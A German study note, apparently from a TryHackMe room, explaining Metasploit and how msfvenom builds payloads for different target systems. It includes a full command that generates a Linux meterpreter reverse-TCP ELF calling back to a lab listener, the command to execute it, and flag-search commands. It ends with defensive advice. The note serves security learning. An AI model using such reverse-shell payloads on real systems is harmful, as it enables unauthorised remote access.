---
title: "Metasploit & msfvenom: Grundlagen"
description: "Wozu das Metasploit-Framework dient, wie msfvenom Payloads für verschiedene Zielsysteme erzeugt und wie man im Lab nach Flags sucht."
date: 2026-10-02
source: "TryHackMe – Metasploit"
tags: [metasploit, msfvenom, ctf]
draft: true
---

> Lernnotiz für autorisierte Lab-/CTF-Umgebungen. Payloads nur auf Systemen einsetzen, für die eine
> ausdrückliche Erlaubnis besteht.

## Was Metasploit ist
Ein Framework, das Module für die einzelnen Phasen eines autorisierten Penetrationstests bündelt:
Informationssammlung, bekannte Schwachstellen-Module, Payloads und Nachbereitung. Statt viele
Einzeltools zu verketten, arbeitet man in einer gemeinsamen Konsole (`msfconsole`).

## msfvenom – Payloads erzeugen
`msfvenom` erzeugt Payloads im passenden Dateiformat fürs Zielsystem. Grundmuster:
`-p <payload>` wählt den Payload, `LHOST`/`LPORT` sind die Adresse des Listeners, `-f <format>` das
Ausgabeformat.

| Ziel | Format | Payload-Familie |
|------|--------|-----------------|
| Linux | `elf` | `linux/x86/...` |
| Windows | `exe` | `windows/...` |
| PHP-Webserver | `raw` (`.php`) | `php/...` |
| ASP-Webserver | `asp` | `windows/...` |
| Python | `raw` (`.py`) | `cmd/unix/...` |

Beispiel für ein Linux-ELF:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<lab-ip> LPORT=<port> -f elf > shell.elf
```
Die `.elf` ist das Linux-Gegenstück zur `.exe`. Auf dem Lab-System muss sie ausführbar gemacht werden:
```bash
chmod +x shell.elf && ./shell.elf
```

## Flags im Lab suchen
```bash
# Linux
find / -name flag.txt 2>/dev/null
# Windows
dir /s /b C:\flag.txt
```

## In eigenen Worten
msfvenom ist im Kern ein „Payload-Baukasten“: Ziel-Betriebssystem und Format wählen, Listener-Adresse
eintragen, fertig. Welche Payload-Familie passt, richtet sich nach dem Dienst, der auf dem Ziel läuft.

## Verteidigungssicht
Endpoint-Schutz erkennt viele Standard-Payloads anhand von Signaturen. Anwendungs-Whitelisting,
aktuelle Patches und das Überwachen ungewöhnlicher Prozess- und Netzwerkaktivität sind die
wirksamsten Gegenmaßnahmen.
